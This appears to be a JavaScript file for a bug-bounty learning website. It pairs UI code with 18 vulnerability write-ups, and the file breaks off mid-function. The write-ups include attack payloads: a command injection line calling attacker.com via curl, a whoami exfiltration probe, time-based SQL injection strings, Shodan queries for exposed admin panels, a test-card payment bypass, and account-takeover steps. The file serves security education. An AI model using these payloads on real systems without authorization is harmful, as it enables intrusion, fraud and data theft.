// ====================================================================
// CYBERSEC BUG BOUNTY HUB - ENHANCED ELITE PLATFORM JAVASCRIPT
// Professional vulnerability documentation with spectacular glowing effects
// ====================================================================

// ====================================================================
// ENHANCED VULNERABILITY DATA SECTION
// ====================================================================
let vulnerabilities =[
  {
    "id": 1,
    "name": "Samsung Username Trailing Space Authentication Bypass",
    "type": "Authentication Bypass",
    "severity": "High",
    "bounty": "$4,620",
    "company": "Samsung",
    "description": "During login, trailing spaces in usernames were ignored by the backend, causing 'admin' and 'admin ' to be treated as the same account. This led to an authentication bypass allowing login into other accounts.",
    "lessonLearned": "Always sanitize and normalize user input, including trimming whitespace before authentication checks.",
    "whenToUse": "Test during login/registration by appending trailing spaces to usernames. Example: 'admin ' or 'admin  ' to check if treated the same as 'admin'.",
    "method": "1. Register or find a valid username (e.g., 'admin').\n2. Attempt login with the username appended with one or more trailing spaces.\n3. If login is successful, the system is vulnerable.",
    "tags": ["Authentication", "Bypass", "High Severity", "Samsung", "User Input", "Whitespace"]
  },
  {
    "id": 2,
    "name": "OS Command Injection via Email Parameter",
    "type": "Command Injection",
    "severity": "High",
    "bounty": "N/A",
    "company": "Various",
    "description": "Some email parameters were directly passed to system functions without sanitization, allowing attackers to execute arbitrary commands on the server.",
    "lessonLearned": "Always sanitize user inputs used in system calls. Use parameterized queries or proper escaping. Out-of-band detection via Burp Collaborator can confirm exploitation.",
    "whenToUse": "Try injecting OS payloads into email parameters, especially in contact, feedback, or password reset forms. Example payload: 'test@domain.com; ping $(whoami).burpcollaborator.net , id@burpcollab.net'.",
    "method": "1. Identify any input accepting an email address.\n2. Inject payloads after the email. Example: 'attacker@example.com; curl attacker.com'.\n3. Monitor DNS or HTTP callbacks using Burp Collaborator.",
    "tags": ["Injection", "Email", "High Severity", "Command Injection", "Out-of-band", "Burp Suite"]
  },
  {
    "id": 3,
    "name": "Arbitrary User Name Modification Vulnerability",
    "type": "Business Logic",
    "severity": "Medium",
    "bounty": "$200",
    "company": "Bugcrowd",
    "description": "User name field modification was possible without proper authorization checks, leading to potential impersonation or tampering.",
    "lessonLearned": "Implement strict ownership validation when updating user-controlled fields, especially those related to identity.",
    "whenToUse": "Check features like invitations, team join requests, or profile updates where other users' data might be set by unverified sources.",
    "method": "1. Create an organization.\n2. Invite the victim's email using a forged first/last name.\n3. Victim receives invite, and the displayed name gets modified without consent.",
    "tags": ["Business Logic", "Account Takeover", "Privilege Escalation"]
  },
  {
    "id": 4,
    "name": "Vespa Configuration Server Exposure",
    "type": "Information Disclosure",
    "severity": "High",
    "bounty": "$1,000",
    "company": "Undisclosed",
    "description": "Exposed Vespa configuration servers were discovered on publicly accessible ports, leaking sensitive configuration files including deployment secrets and endpoints.",
    "lessonLearned": "Do not expose internal management services to the internet. Always restrict access using VPNs, firewall rules, or IP whitelisting.",
    "whenToUse": "Enumerate open ports (e.g., 19071) on subdomains during infrastructure assessment.",
    "tags": ["Information Disclosure", "Internal Services", "Misconfiguration", "Vespa"]
  },
  {
    "id": 5,
    "name": "Case-Sensitive Email Blacklist Bypass",
    "type": "Authentication Bypass",
    "severity": "High",
    "bounty": "N/A",
    "company": "Undisclosed",
    "description": "Applications enforcing email blacklists may overlook case variations. This allows bypass by changing the letter casing of a blocked email.",
    "lessonLearned": "Ensure case-insensitive comparison for email blacklists. Normalize to lowercase before comparison.",
    "whenToUse": "Test registrations or input forms using mixed-case variants of blacklisted addresses. Example: 'ADMIN@target.com' vs 'admin@target.com'.",
    "method": "1. Register with blacklisted email → gets rejected.\n2. Register with case-variant of the same email → gets accepted.\n3. Abuse to bypass email-based access control.",
    "tags": ["Authentication", "Bypass", "Blacklist", "Admin Access"]
  },
  {
    "id": 6,
    "name": "Payment Bypass via Test Card Enabled",
    "type": "Business Logic",
    "severity": "Critical",
    "bounty": "Undisclosed",
    "company": "Undisclosed",
    "description": "Production payment systems mistakenly accepted test card numbers, allowing purchases without real transactions.",
    "lessonLearned": "Strictly disable all test payment configurations in production environments. Ensure payment gateways are properly configured.",
    "whenToUse": "Test production checkout flows using standard test cards provided by payment processors like Stripe.",
    "method": "1. Visit the checkout page of the target application.\n2. Use Stripe test card: 4242 4242 4242 4242 with any future expiry, any CVV.\n3. Complete checkout process → success (if vulnerable).\n4. Reference Stripe documentation for test cards: https://docs.stripe.com/testing#international-cards.",
    "tags": ["Business Logic", "Payment", "Test Card", "Bypass"]
  },
  {
    "id": 7,
    "name": "Host Header Injection for Subdomain Bypass",
    "type": "Injection",
    "severity": "High",
    "bounty": "N/A",
    "company": "Undisclosed",
    "description": "Improper handling of Host headers allowed manipulation of routing, leading to sensitive endpoints becoming accessible via crafted Host values.",
    "lessonLearned": "Validate and whitelist Host headers on the server-side. Reject any unexpected Host headers.",
    "whenToUse": "Inject malicious Host headers in requests to subdomains or APIs. Example: Host: attacker.com.",
    "method": "1. Intercept a request and modify the Host header.\n2. Example payload: Host: attacker.com.\n3. Observe if you gain access to unintended resources.",
    "tags": ["Injection", "Host Header", "Misconfiguration", "Subdomain Bypass"]
  },
  {
    "id": 8,
    "name": "SQL Injection in User-Agent Header",
    "type": "SQL Injection",
    "severity": "Critical",
    "bounty": "Undisclosed",
    "company": "Undisclosed",
    "description": "SQL queries were improperly constructed using unsanitized User-Agent header values, leading to SQL injection vulnerabilities.",
    "lessonLearned": "Never trust HTTP headers. Sanitize all inputs, including HTTP headers, before using them in database queries.",
    "whenToUse": "Inject SQL payloads into User-Agent headers of requests to backend systems relying on relational databases.",
    "method": "1. Set User-Agent header to payload like: XOR(if(now()=sysdate(),sleep(5),0))XOR.\n2. Observe server delay → indicates SQL injection.",
    "tags": ["Injection", "SQLi", "Critical", "PHP", "User-Agent"]
  },
  {
    "id": 9,
    "name": "2FA Bypass via Password Reset",
    "type": "Access Control",
    "severity": "High",
    "bounty": "N/A",
    "company": "Undisclosed",
    "description": "Inconsistent enforcement of 2FA post password reset allowed attackers to log in to accounts without providing the second factor.",
    "lessonLearned": "Ensure consistent enforcement of 2FA across all authentication flows, including post-password reset.",
    "whenToUse": "Test password reset and login flows, inspecting whether 2FA is required post-reset.",
    "method": "1. Register an account and enable 2FA.\n2. Initiate password reset.\n3. Complete login process after resetting password.\n4. Check if OTP is required.\n5. Additional vectors: Intercept redirects, manipulate code parameters, or test SMS endpoints.",
    "tags": ["Access Control", "2FA", "OTP", "Bypass"]
  },
  {
    "id": 10,
    "name": "IDOR on Unauthenticated API Endpoint",
    "type": "Insecure Direct Object Reference",
    "severity": "High",
    "bounty": "Undisclosed",
    "company": "Undisclosed",
    "description": "API endpoint allowed enumeration of other users' data due to lack of authentication/authorization mechanisms, combined with predictable user IDs.",
    "lessonLearned": "Always enforce authentication and authorization on all endpoints exposing sensitive or user-specific data.",
    "whenToUse": "Identify API endpoints using IDs in parameters (e.g., user_id=123). Test by incrementing or fuzzing ID values to access unauthorized resources.",
    "method": "1. Identify API endpoint with parameterized access like: /api/v1/export?user_id=123.\n2. Increment or brute-force the ID parameter: /api/v1/export?user_id=124, 125, etc.\n3. Use fuzzing or custom scripts for automation.\n4. Try replacing specific IDs with wildcards or special values (*, all, etc.) to test for broader data exposure.\n5. Monitor for unauthorized or excessive data leakage.",
    "tags": ["IDOR", "API", "Authorization", "Unauthenticated"]
  },
     {
    "id": 11,
    "name": "0-Click Account Takeover via Punycode (IDN) Attack",
    "type": "Account Takeover",
    "severity": "Critical",
    "bounty": "Undisclosed",
    "company": "Undisclosed",
    "description": "Leveraging Unicode homoglyphs in emails to achieve account takeover without interaction from the victim.",
    "lessonLearned": "Normalize and validate email addresses, including Unicode normalization before storing or comparing.",
    "whenToUse": "Test registration and password reset flows with visually similar email variations using Punycode/Unicode.",
    "method": "Steps:\n\n1️⃣ Create an account with an email like: xyze123@domain.com.burpcollaborator.net\n\n  2️⃣ Attempt to create another account with a Punycode/Unicode version: xyzé123@domain.com.burpcollaborator.net\n\n3️⃣ If the application shows 'Email already exists', proceed to reset the password for the Punycode version.\n\n4️⃣ Monitor your Burp Collaborator inbox → If the reset link arrives there → proceed.\n\n5️⃣ Reset the password → Attempt login with the xyze123@domain.com.burpcollab.net with changed password.\n\n6️⃣ If login works → Account Takeover Confirmed.\n\n📌 Impact: Full account takeover without victim interaction.",
    "tags": ["0-Click", "Account Takeover", "Punycode", "IDN", "Email", "Critical"]
  } ,
    {
    "id": 12,
    "name": "Time-Based SQL Injection in Legacy Application",
    "type": "SQL Injection",
    "severity": "Critical",
    "bounty": "Undisclosed",
    "company": "Undisclosed",
    "description": "Legacy application vulnerable to time-based SQL Injection allowing remote attackers to execute arbitrary queries.",
    "lessonLearned": "Sanitize all input parameters and use parameterized queries to prevent SQL injection.",
    "whenToUse": "Especially target legacy applications (8+ years old), older PHP versions, and suspicious API endpoints.",
    "method": "Steps:\n\n1️⃣ While manually analyzing the API behavior, attempt to pass SQL payloads into input fields or URL parameters.\n\n2️⃣ In this case, I discovered a vulnerable parameter that directly interacted with SQL queries.\n\n3️⃣ Injected a **time-based blind SQLi** payload: ')waitfor delay '0:0:10'--\n\n4️⃣ The response from the application was delayed by exactly 10 seconds → confirming that SQL code was successfully executed by the database.\n\n📌 Impact: Time-based SQLi can be used to enumerate database contents, extract sensitive information, or even gain RCE depending on DBMS configuration.",
    "tags": ["SQL Injection", "Time-Based", "Legacy Application", "Critical", "Production"]
  },
  {
  "id": 13,
  "name": "Privilege Escalation via Insecure Role Enforcement - Viewer Creates Reviews",
  "type": "Privilege Escalation",
  "severity": "High",
  "bounty": "$2,000+",
  "company": "Target Application (Redacted)",
  "description": "Viewer role exploited to create/modify reviews by abusing improper backend role enforcement.",
  "lessonLearned": "Implement proper role-based access control (RBAC) validation server-side for each sensitive action.",
  "whenToUse": "Whenever testing API endpoints, especially those related to CRUD operations restricted to higher roles.",
  "method": "Steps:\n\n1️⃣ Captured a legitimate DELETE request from a 'Member' user for deleting a review.\n\n2️⃣ Replayed that request as 'Viewer' → Got 403 Forbidden ❌.\n\n3️⃣ Modified the request method to PUT → Got 400 Bad Request ❗. Response body revealed that 'name' field was required.\n\n4️⃣ Crafted the PUT request:\n\nPUT /api/reviews/{review_id}\nContent-Type: application/json\n{\n  \"name\": \"Review created by Viewer!\"\n}\n\n5️⃣ Sent the request → 200 OK ✅ → Review created/modified by Viewer account.\n\n📌 Impact: Viewer → Member privilege escalation → unauthorized content creation.",
  "tags": ["Privilege Escalation", "Authorization Bypass", "High Severity", "Insecure Direct Object Reference (IDOR)", "Broken Access Control"]
},{
  "id": 14, 
  "name": "Account Takeover via Insecure Friend Invitation Token (OAuth Exploitation)",
  "type": "Account Takeover",
  "severity": "Critical",
  "bounty": "$1800", 
  "company": "Target Application (Redacted)",
  "description": "Improper authorization on friend invitation links allowed full account takeover of other users authenticated via Google OAuth.",
  "lessonLearned": "Implement secure, single-use, and properly scoped tokens with strong validation to prevent unauthorized access via invitation links.",
  "whenToUse": "Always inspect invitation/referral links and their associated tokens or identifiers during OAuth-based workflows.",
  "method": "Steps:\n\n1️⃣ Signed up for the application using Google OAuth.\n\n2️⃣ After logging in, accessed the 'Friends' feature to invite contacts.\n\n3️⃣ Selected the victim's email (appearing via Google Contacts) → intercepted the request.\n\n4️⃣ Response contained a generated invitation link.\n\n5️⃣ Opened the link in a separate browser session → Logged in as the **victim** without verification.\n\n6️⃣ Gained **full access** to the victim's account → Could view, modify, delete data, change passwords, and enable 2FA.\n\n📌 Impact: **Full Account Takeover (ATO)** of any Google OAuth user with an email in my contact list.",
  "tags": ["Account Takeover", "Critical Severity", "OAuth", "Authentication Bypass", "Broken Access Control", "IDOR"]
},{
  "id": 15,
  "name": "Expired Trial Plan Bypass via State Manipulation",
  "type": "Business Logic Flaw",
  "severity": "Medium",
  "bounty": "$500",  
  "company": "Private Program",
  "description": "The application used a 'state' parameter in its API responses to track subscription status. By changing \"state\":\"trial_suspended\" to \"state\":\"trial_active\", I was able to bypass the expired trial restriction and regain premium access.",
  "lessonLearned": "Do not rely solely on client-side or easily tampered fields to enforce access control. Always validate subscription status server-side.",
  "whenToUse": "When testing applications with free trial restrictions or subscription models, intercept responses and modify 'state' or related fields to check for logic flaws.",
  "method": "1. Start a trial account and let it expire.\n2. Intercept API responses related to subscription status.\n3. Identify fields like \"state\":\"trial_suspended\".\n4. Modify it to \"state\":\"trial_active\".\n5. Forward the modified request and check for restricted feature access.",
  "tags": ["Business Logic", "Trial Bypass", "Medium Severity", "Access Control", "BugBounty"]
},
{
  "id": 16,
  "name": "IDOR on Export Customer Data in Unlocked Staging Subdomain",
  "type": "IDOR",
  "severity": "High",
  "bounty": "$7,790",
  "company": "Confidential",
  "description": "An unlocked staging subdomain exposed a customer data export feature. By manipulating the `userId` parameter in the export request, I was able to access sensitive data of other users without proper authorization checks.",
  "lessonLearned": "All sensitive operations, especially in test/staging environments, should have strict authorization and resource ownership checks enforced on the server side. Exposing such endpoints to the internet increases risk significantly.",
  "whenToUse": "Always test staging/test subdomains for sensitive features like report exports, PDF generations, or customer listings that may lack proper authorization checks. These are often neglected during development.",
  "method": "1. Perform subdomain enumeration to find staging/test environments.\n2. Authenticate to the application (if required).\n3. Locate privileged functionality like data exports, report downloads, or admin features.\n4. Intercept requests with Burp Suite and identify parameters like:\n- userId\n- customerId\n- exportId\n5. Modify these parameters to reference other users (e.g., `userId=123 ➔ userId=9999`).\n6. Observe if sensitive data from other accounts is returned.\n7. Capture full PoC: request/response pairs and screenshots of exposed data.\n8. Submit a detailed report to the program.",
  "tags": ["IDOR", "Broken Access Control", "Staging Environment", "Export Feature", "Sensitive Data Exposure", "Bug Bounty", "Burp Suite"]
}
,{
  "id": 17,
  "name": "Evertz Admin Panel Exposure via Shodan",
  "type": "Sensitive Panel Exposure",
  "severity": "High",
  "bounty": "N/A",
  "company": "Multiple Targets via Shodan",
  "description": "Exposed Evertz Admin Panels were discovered using Shodan search queries. These administrative interfaces were publicly accessible, risking exposure of sensitive system controls. If unauthenticated access is possible, or if chained with further exploits, Remote Code Execution (RCE) could be achieved.",
  "lessonLearned": "Sensitive administrative interfaces must not be exposed to the internet. Implement strict authentication, IP whitelisting, and ensure the interface is restricted to internal networks or VPNs only.",
  "whenToUse": "Perform during external attack surface enumeration using Shodan or other search engines to detect exposed sensitive infrastructure panels.",
  "method": "1. Use specific Shodan queries to discover exposed panels:\n- http.title:\"Evertz Admin Panel\"\n- html:\"Evertz Microsystems Ltd\"\n- http.favicon.hash:-1718033478\n- \"evertz\" port:80,443\n2. Example Shodan CLI commands:\n- shodan search 'http.title:\"Evertz Admin Panel\"' --fields ip_str,port,hostnames\n- shodan search 'html:\"Evertz Microsystems Ltd\"' --fields ip_str,port,org\n- shodan search --limit 100 'http.favicon.hash:-1718033478' --fields ip_str,port,hostnames,org --format json\n3. After identifying panels, check for default credentials, weak authentication, or exposed functionality like file exports or diagnostics which may lead to RCE when exploited properly.",
  "tags": ["Evertz", "Shodan", "Admin Panel Exposure", "Critical Infrastructure", "Reconnaissance", "RCE Potential"]
}
,
 {
  "id": 18,
  "name": "HTTP Parameter Pollution on Multiple Parameters for Sensitive Data or Logic Bypass",
  "type": "Sensitive Data Exposure / Logic Bypass",
  "severity": "High",
  "bounty": "$1,000",
  "company": "Private Program",
  "description": "The application accepted multiple parameters like `id`, `user`, `product`, `price`, and `redirect` in GET requests. By injecting duplicates or encoded variations of these parameters, it was possible to manipulate backend logic, retrieve unauthorized data, or trigger open redirects.",
  "lessonLearned": "Ensure strict validation of each parameter. Reject or sanitize duplicate or unexpected parameter variations to prevent exploitation.",
  "whenToUse": "Test when encountering multiple parameters in GET or POST requests, especially those controlling sensitive operations like user info, pricing, or redirection.",
  "method": "1. Identify endpoints such as:\n- ?id=123&user=normal&product=1&price=100&redirect=/dashboard\n2. Inject duplicates for each parameter individually or in combination:\n- ?id=123&id=9999&user=normal&user=admin\n- ?product=1;product=9999&price=10;price=0\n- ?redirect=/dashboard&redirect=https://evil.com\n- ?price=10%26price=0\n- ?user=normal,user=admin\n- ?id=1;user=admin;price=0\n- ?id=1,user=admin,price=0\n3. Analyze the response for unauthorized access, pricing manipulation, or redirection to attacker-controlled domains.",
  "tags": ["HTTP Parameter Pollution", "Sensitive Data Exposure", "Open Redirect", "Logic Bypass", "Bug Bounty", "Multiple Parameters"]
}


];

// ====================================================================
// GLOBAL STATE MANAGEMENT
// ====================================================================
let currentBugs = [...vulnerabilities];
let currentFilter = 'all';
let currentSort = 'date-desc';
let searchTerm = '';
let currentTheme = 'dark'; // Default to dark theme as requested

// Severity order for sorting
const severityOrder = {
    'Critical': 4,
    'High': 3,
    'Medium': 2,
    'Low': 1
};

// ====================================================================
// DOM ELEMENTS
// ====================================================================
const elements = {
    bugsGrid: null,
    searchInput: null,
    sortSelect: null,
    filterButtonsContainer: null,
    clearFiltersBtn: null,
    resultCount: null,
    noResults: null,
    modalOverlay: null,
    modalClose: null,
    modalTitle: null,
    modalContent: null,
    themeToggle: null,
    newsletterForm: null
};

// ====================================================================
// INITIALIZATION
// ====================================================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 CyberSec Bug Bounty Hub initializing...');
    initializeElements();
    generateFilterButtons();
    initializeTheme();
    setupEventListeners();
    renderBugs(currentBugs);
    updateResultCount();
    addSpectacularEffects();
    console.log('✨ Elite platform ready with spectacular glowing effects!');
});

function initializeElements() {
    elements.bugsGrid = document.getElementById('bugsGrid');
    elements.searchInput = document.getElementById('searchInput');
    elements.sortSelect = document.getElementById('sortSelect');
    elements.filterButtonsContainer = document.getElementById('filter-buttons-container');
    elements.clearFiltersBtn = document.getElementById('clearFilters');
    elements.resultCount = document.getElementById('resultCount');
    elements.noResults = document.getElementById('noResults');
    elements.modalOverlay = document.getElementById('modalOverlay');
    elements.modalClose = document.getElementById('modalClose');
    elements.modalTitle = document.getElementById('modalTitle');
    elements.modalContent = document.getElementById('modalContent');
    elements.themeToggle = document.getElementById('themeToggle');
    elements.newsletterForm = document.getElementById('newsletterForm');
}

function generateFilterButtons() {
    const categories = new Set();
    vulnerabilities.forEach(vuln => {
        categories.add(vuln.type);
        categories.add(vuln.severity);
    });

    const filterButtonsHTML = `
        <button class="filter-btn active glow-hover" data-filter="all" aria-pressed="true">🌟 All</button>
        ${[...categories].sort().map(category => `
            <button class="filter-btn glow-hover" data-filter="${escapeHtml(category)}" aria-pressed="false">${escapeHtml(category)}</button>
        `).join('')}
    `;
    elements.filterButtonsContainer.innerHTML = filterButtonsHTML;
}

// ====================================================================
// SPECTACULAR GLOWING EFFECTS
// ====================================================================
function addSpectacularEffects() {
    // Add dynamic glowing particles to header
    createGlowingParticles();
    
    // Add hover sound effects (visual feedback)
    addHoverGlowEffects();
    
    // Add typing indicator for search
    addSearchGlowEffect();
    
    // Add footer heart pulsing effect
    enhanceHeartPulsing();
    
    console.log('✨ Spectacular glowing effects activated!');
}

function createGlowingParticles() {
    const header = document.querySelector('.header');
    if (!header) return;

    // Create floating particles
    for (let i = 0; i < 15; i++) {
        const particle = document.createElement('div');
        particle.className = 'floating-particle';
        particle.style.cssText = `
            position: absolute;
            width: 4px;
            height: 4px;
            background: var(--color-primary);
            border-radius: 50%;
            pointer-events: none;
            opacity: 0.6;
            animation: float ${3 + Math.random() * 4}s ease-in-out infinite;
            left: ${Math.random() * 100}%;
            top: ${Math.random() * 100}%;
            box-shadow: 0 0 10px var(--glow-primary);
        `;
        header.style.position = 'relative';
        header.appendChild(particle);
    }

    // Add floating animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.6; }
            25% { transform: translateY(-20px) rotate(90deg); opacity: 1; }
            50% { transform: translateY(-40px) rotate(180deg); opacity: 0.8; }
            75% { transform: translateY(-20px) rotate(270deg); opacity: 1; }
        }
    `;
    document.head.appendChild(style);
}

function addHoverGlowEffects() {
    // Enhanced card hover effects
    document.addEventListener('mouseover', function(e) {
        if (e.target.closest('.bug-card')) {
            const card = e.target.closest('.bug-card');
            card.style.transition = 'all 0.3s ease';
            card.style.filter = 'brightness(1.1)';
        }
        
        if (e.target.closest('.glow-hover')) {
            e.target.closest('.glow-hover').style.filter = 'brightness(1.2) saturate(1.2)';
        }
    });

    document.addEventListener('mouseout', function(e) {
        if (e.target.closest('.bug-card')) {
            const card = e.target.closest('.bug-card');
            card.style.filter = 'brightness(1)';
        }
        
        if (e.target.closest('.glow-hover')) {
            e.target.closest('.glow-hover').style.filter = 'brightness(1) saturate(1)';
        }
    });
}

function addSearchGlowEffect() {
    const searchInput = elements.searchInput;
    if (!searchInput) return;

    searchInput.addEventListener('focus', function() {
        this.style.boxShadow = '0 0 20px var(--glow-primary), 0 0 40px var(--glow-primary)';
        this.style.transform = 'scale(1.02)';
    });

    searchInput.addEventListener('blur', function() {
        this.style.boxShadow = '';
        this.style.transform = 'scale(1)';
    });

    // Add typing effect
    searchInput.addEventListener('input', function() {
        this.style.borderColor = 'var(--color-primary)';
        this.style.boxShadow = '0 0 15px var(--glow-primary)';
        
        setTimeout(() => {
            this.style.borderColor = '';
            this.style.boxShadow = '';
        }, 500);
    });
}

function enhanceHeartPulsing() {
    const heart = document.querySelector('.pulsing-heart');
    if (!heart) return;

    // Add extra pulsing effect on hover
    heart.addEventListener('mouseenter', function() {
        this.style.animation = 'heartPulse 0.5s ease-in-out infinite';
        this.style.fontSize = '1.5rem';
    });

    heart.addEventListener('mouseleave', function() {
        this.style.animation = 'heartPulse 1.5s ease-in-out infinite';
        this.style.fontSize = '1.2rem';
    });
}

// ====================================================================
// ENHANCED THEME TOGGLE FUNCTIONALITY
// ====================================================================
function initializeTheme() {
    // Check for saved theme preference or default to dark mode
    const savedTheme = localStorage.getItem('cybersec-theme') || 'dark';
    setTheme(savedTheme);
    console.log(`🎨 Theme initialized: ${savedTheme} mode`);
}

function setTheme(theme) {
    currentTheme = theme;
    document.documentElement.setAttribute('data-color-scheme', theme);
    localStorage.setItem('cybersec-theme', theme);
    updateThemeToggleAriaLabel(theme);
    
    // Add theme transition effect
    document.body.style.transition = 'all 0.3s ease';
    
    console.log(`🌓 Theme switched to: ${theme} mode`);
}

function toggleTheme() {
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    setTheme(newTheme);
    
    // Add spectacular transition effect
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: ${newTheme === 'dark' ? '#000' : '#fff'};
        opacity: 0;
        z-index: 9999;
        pointer-events: none;
        transition: opacity 0.3s ease;
    `;
    document.body.appendChild(overlay);
    
    setTimeout(() => {
        overlay.style.opacity = '0.3';
        setTimeout(() => {
            overlay.style.opacity = '0';
            setTimeout(() => document.body.removeChild(overlay), 300);
        }, 100);
    }, 10);
    
    // Announce theme change
    announceToScreenReader(`Switched to ${newTheme} theme with spectacular effects!`);
}

function updateThemeToggleAriaLabel(theme) {
    const oppositeTheme = theme === 'dark' ? 'light' : 'dark';
    elements.themeToggle.setAttribute('aria-label', `Switch to ${oppositeTheme} theme`);
    elements.themeToggle.setAttribute('title', `Switch to ${oppositeTheme} theme`);
}

// ====================================================================
// ADVANCED SEARCH & FILTERING FUNCTIONALITY
// ====================================================================
function handleAdvancedSearch() {
    searchTerm = elements.searchInput.value.toLowerCase().trim();
    
    // Multi-field search with enhanced scoring
    let filteredBugs = vulnerabilities.filter(bug => {
        const searchableContent = [
            bug.name,
            bug.type,
            bug.description,
            bug.lessonLearned,
            bug.method,
            bug.company,
            bug.whenToUse,
            ...bug.tags
        ].join(' ').toLowerCase();
        
        return searchableContent.includes(searchTerm);
    });
    
    // Apply current filter
    if (currentFilter !== 'all') {
        filteredBugs = filteredBugs.filter(bug => {
            return bug.type.includes(currentFilter) || 
                   bug.tags.some(tag => tag.includes(currentFilter)) ||
                   bug.severity.includes(currentFilter) ||
                   bug.company.includes(currentFilter);
        });
    }
    
    // Apply current sorting
    filteredBugs = applySorting(filteredBugs);
    
    currentBugs = filteredBugs;
    renderBugs(currentBugs);
    updateResultCount();
    updateFilterButtonStates();
    
    // Add search feedback effect
    if (searchTerm && filteredBugs.length === 0) {
        addSearchFeedbackEffect('no-results');
    } else if (searchTerm && filteredBugs.length > 0) {
        addSearchFeedbackEffect('results-found');
    }
}

function addSearchFeedbackEffect(type) {
    const searchInput = elements.searchInput;
    if (type === 'no-results') {
        searchInput.style.borderColor = 'var(--color-error)';
        searchInput.style.boxShadow = '0 0 15px rgba(var(--color-error-rgb), 0.5)';
    } else {
        searchInput.style.borderColor = 'var(--color-success)';
        searchInput.style.boxShadow = '0 0 15px rgba(var(--color-success-rgb), 0.5)';
    }
    
    setTimeout(() => {
        searchInput.style.borderColor = '';
        searchInput.style.boxShadow = '';
    }, 1000);
}

function applySorting(bugs) {
    const [criteria, order] = currentSort.split('-');
    
    return bugs.sort((a, b) => {
        let valueA, valueB;
        
        switch (criteria) {
            case 'date':
                valueA = new Date(a.dateAdded);
                valueB = new Date(b.dateAdded);
                break;
            case 'severity':
                valueA = severityOrder[a.severity] || 0;
                valueB = severityOrder[b.severity] || 0;
                break;
            case 'bounty':
                valueA = parseFloat(a.bounty.replace(/[$,]/g, '')) || 0;
                valueB = parseFloat(b.bounty.replace(/[$,]/g, '')) || 0;
                break;
            case 'name':
                valueA = a.name.toLowerCase();
                valueB = b.name.toLowerCase();
                break;
            default:
                return 0;
        }
        
        if (order === 'desc') {
            return valueB > valueA ? 1 : valueB < valueA ? -1 : 0;
        } else {
            return valueA > valueB ? 1 : valueA < valueB ? -1 : 0;
        }
    });
}

function handleFilter(event) {
    const filterValue = event.target.getAttribute('data-filter');
    currentFilter = filterValue;
    
    // Update button states with glowing effect
    elements.filterButtonsContainer.querySelectorAll('.filter-btn').forEach(btn => {
        btn.classList.remove('active');
        btn.setAttribute('aria-pressed', 'false');
        btn.style.boxShadow = '';
    });
    
    event.target.classList.add('active');
    event.target.setAttribute('aria-pressed', 'true');
    event.target.style.boxShadow = '0 0 20px var(--glow-primary)';
    
    handleAdvancedSearch();
    
    // Add filter feedback
    announceToScreenReader(`Filter applied: ${filterValue}`);
}

function handleSort() {
    currentSort = elements.sortSelect.value;
    handleAdvancedSearch();
    
    // Add sort feedback effect
    elements.sortSelect.style.boxShadow = '0 0 15px var(--glow-secondary)';
    setTimeout(() => {
        elements.sortSelect.style.boxShadow = '';
    }, 500);
}

function clearAllFilters() {
    // Reset all filters and search
    elements.searchInput.value = '';
    searchTerm = '';
    currentFilter = 'all';
    currentSort = 'date-desc';
    elements.sortSelect.value = 'date-desc';
    
    // Reset filter buttons with animation
    elements.filterButtonsContainer.querySelectorAll('.filter-btn').forEach(btn => {
        btn.classList.remove('active');
        btn.setAttribute('aria-pressed', 'false');
        btn.style.boxShadow = '';
    });
    
    const allButton = document.querySelector('[data-filter="all"]');
    allButton.classList.add('active');
    allButton.setAttribute('aria-pressed', 'true');
    allButton.style.boxShadow = '0 0 20px var(--glow-primary)';
    
    // Apply changes
    currentBugs = [...vulnerabilities];
    currentBugs = applySorting(currentBugs);
    renderBugs(currentBugs);
    updateResultCount();
    
    // Add clear feedback effect
    elements.clearFiltersBtn.style.transform = 'scale(0.95)';
    elements.clearFiltersBtn.style.boxShadow = '0 0 25px var(--color-error)';
    
    setTimeout(() => {
        elements.clearFiltersBtn.style.transform = 'scale(1)';
        elements.clearFiltersBtn.style.boxShadow = '';
    }, 200);
    
    // Announce to screen readers
    announceToScreenReader('All filters cleared! Showing all vulnerabilities.');
    
    // Focus back to search input
    elements.searchInput.focus();
}

function updateResultCount() {
    const count = currentBugs.length;
    elements.resultCount.textContent = count;
    
    // Add count animation
    elements.resultCount.style.transform = 'scale(1.2)';
    elements.resultCount.style.color = 'var(--color-primary)';
    
    setTimeout(() => {
        elements.resultCount.style.transform = 'scale(1)';
        elements.resultCount.style.color = '';
    }, 300);
    
    // Update accessibility
    const counterElement = document.getElementById('resultsCounter');
    if (counterElement) {
        counterElement.setAttribute('aria-label', `Showing ${count} vulnerabilities out of ${vulnerabilities.length} total`);
    }
}

function updateFilterButtonStates() {
    elements.filterButtonsContainer.querySelectorAll('.filter-btn').forEach(btn => {
        const filterValue = btn.getAttribute('data-filter');
        if (filterValue === currentFilter) {
            btn.classList.add('active');
            btn.setAttribute('aria-pressed', 'true');
            btn.style.boxShadow = '0 0 20px var(--glow-primary)';
        } else {
            btn.classList.remove('active');
            btn.setAttribute('aria-pressed', 'false');
            btn.style.boxShadow = '';
        }
    });
}

// ====================================================================
// EVENT LISTENERS SETUP
// ====================================================================
function setupEventListeners() {
    // Search functionality with enhanced debouncing
    let searchTimeout;
    elements.searchInput.addEventListener('input', function() {
        clearTimeout(searchTimeout);
        searchTimeout = setTimeout(handleAdvancedSearch, 300);
    });
    
    // Sort functionality
    elements.sortSelect.addEventListener('change', handleSort);
    
    // Filter buttons with event delegation
    elements.filterButtonsContainer.addEventListener('click', function(e) {
        if (e.target.classList.contains('filter-btn')) {
            handleFilter(e);
        }
    });

    elements.filterButtonsContainer.addEventListener('keydown', function(e) {
        if ((e.key === 'Enter' || e.key === ' ') && e.target.classList.contains('filter-btn')) {
            e.preventDefault();
            handleFilter(e);
        }
    });

    elements.filterButtonsContainer.addEventListener('mouseover', function(e) {
        if (e.target.classList.contains('filter-btn') && !e.target.classList.contains('active')) {
            e.target.style.boxShadow = '0 0 15px var(--glow-secondary)';
        }
    });

    elements.filterButtonsContainer.addEventListener('mouseout', function(e) {
        if (e.target.classList.contains('filter-btn') && !e.target.classList.contains('active')) {
            e.target.style.boxShadow = '';
        }
    });
    
    // Clear filters button
    elements.clearFiltersBtn.addEventListener('click', clearAllFilters);
    
    // Theme toggle with enhanced effects
    elements.themeToggle.addEventListener('click', toggleTheme);
